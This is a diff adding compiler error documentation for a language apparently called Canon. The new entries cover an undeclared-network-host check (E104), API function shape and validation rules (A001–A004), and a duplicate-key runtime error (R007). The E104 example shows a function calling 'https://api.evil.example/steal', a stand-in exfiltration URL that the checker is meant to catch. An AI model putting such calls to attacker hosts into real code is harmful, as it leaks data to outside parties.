@@ -361,6 +361,25 @@ fn wait_for(n: Int) -> Int
 example.cn:2:4: error E103: the requires clause of fn wait_for performs effects: time (via now); contracts must be pure
 ```
 
+### E104
+
+A literal URL whose host the function does not declare, when it declares other hosts with `net(<host>)`. The patch adds the host; whether the function should call it is your decision, so `--fix` does not apply it. Plain `net` allows every host.
+
+```canon
+# expect: E104
+fn charge() -> Result[String, Error]
+  effects: net(api.stripe.com)
+{
+  return http_get("https://api.evil.example/steal")
+}
+```
+
+```text
+example.cn:2:4: error E104: fn charge calls host api.evil.example (via http_get), but declares only net(api.stripe.com); add net(api.evil.example), or declare plain net for any host
+```
+
+A computed URL cannot be checked before the program runs. The capability guard checks it instead, and traps with R006 when the host is not one the calling function declares.
+
 ### Effects in tests
 
 Test blocks are effect-checked too. `io`, `time` and `rand` need no declaration in a test, because `canon test` makes them deterministic; `fs` and `net` are real, so a test that uses them declares them on the line after its name, and E101 (with its patch) or E102 apply as for functions:
@@ -657,6 +676,57 @@ fn main() -> Unit
 example.cn:8:9: error T011: print performs io, but it is used where the function type fn(String) -> Unit allows no such effects; declare them in that type, e.g. fn(String) -> Unit effects: io
 ```
 
+## API functions
+
+An `api fn` is a function with a `route:` clause. These checks keep every endpoint something both generated sides can carry.
+
+### A001
+
+The shape of an api fn: a path parameter that is not an Int or String parameter; a GET or DELETE parameter that is not a scalar (or an Option of one); more than one body parameter, or a body that is not a record; a type that cannot be sent as JSON (a function, a table, `Option[Option[T]]`, a map with non-String keys); an error type that is not a sum type; a field name that cannot exist in Python; a generic api fn. The message names the allowed form.
+
+```canon
+type Query {
+  text: String,
+}
+
+# expect: A001
+api fn search(q: Query) -> List[String]
+  route: GET "/search"
+{
+  return [q.text]
+}
+```
+
+```text
+example.cn:6:8: error A001: api fn search: the query parameter q must be Int, Float, Bool, String or an Option of one, not Query; GET has no body
+```
+
+### A002
+
+Two endpoints with the same method and path, in one file or across a project. Parameter names do not matter: `/todos/{id}` and `/todos/{todo_id}` are the same route.
+
+### A003
+
+An api fn's `requires` is its request validation. It runs on the server and in the generated client, so it may use only comparisons, arithmetic, `&&`, `||`, `!`, fields, literals and `str_len`, `trim`, `contains`, `len`, `is_email`, `is_some`.
+
+```canon
+fn short(s: String) -> Bool {
+  return str_len(s) < 20
+}
+
+# expect: A003
+api fn hello(name: String) -> String
+  route: GET "/hello"
+  requires: short(name)
+{
+  return "hi " + name
+}
+```
+
+### A004
+
+A table used other than as the first argument of `get`, `scan`, `insert`, `save`, `delete`, `next_id` or `count`. Every access to a table goes through those built-ins, so the effect checker sees each one as `store(<table>)`.
+
 ## Modules
 
 ### M001
@@ -824,6 +894,14 @@ fn main() -> Unit
 
 ```json
 {"code":"R006","message":"effect net denied by the host (http_get)","line":4,"col":20,"stack":[{"fn":"main","line":4,"col":20}]}
+```
+
+### R007
+
+`insert` into a table that already has a row with that key. Use `save` to insert or replace.
+
+```json
+{"code":"R007","message":"duplicate key 1 in table todos","line":9,"col":3,"stack":[{"fn":"main","line":9,"col":3}]}
 ```
 
 ### R000
